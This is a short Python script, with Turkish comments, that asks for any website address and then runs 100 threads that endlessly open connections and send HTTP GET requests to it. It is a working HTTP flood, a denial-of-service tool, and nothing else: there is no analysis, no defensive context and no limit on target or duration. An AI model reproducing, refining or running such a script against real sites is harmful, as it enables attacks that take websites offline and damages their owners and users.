import socket
import threading
import time

PORT = 80  # HTTP için 80, HTTPS için 443 (ama HTTPS için extra şeyler lazım olur)
THREAD_COUNT = 100
MESSAGE_TEMPLATE = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n"

# Başlangıçta kullanıcıdan site adresi al
host = input("Site adresini gir (örnek: example.com): ")
MESSAGE = MESSAGE_TEMPLATE.format(host).encode()

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, PORT))
            s.sendall(MESSAGE)
            s.close()
            print(f"[+] Paket gönderildi {host}:{PORT}")
        except Exception as e:
            print(f"[-] Hata: {e}")
            time.sleep(0.5)

# Thread'leri başlat
for _ in range(THREAD_COUNT):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

# Ana thread uyusun
while True:
    time.sleep(10)
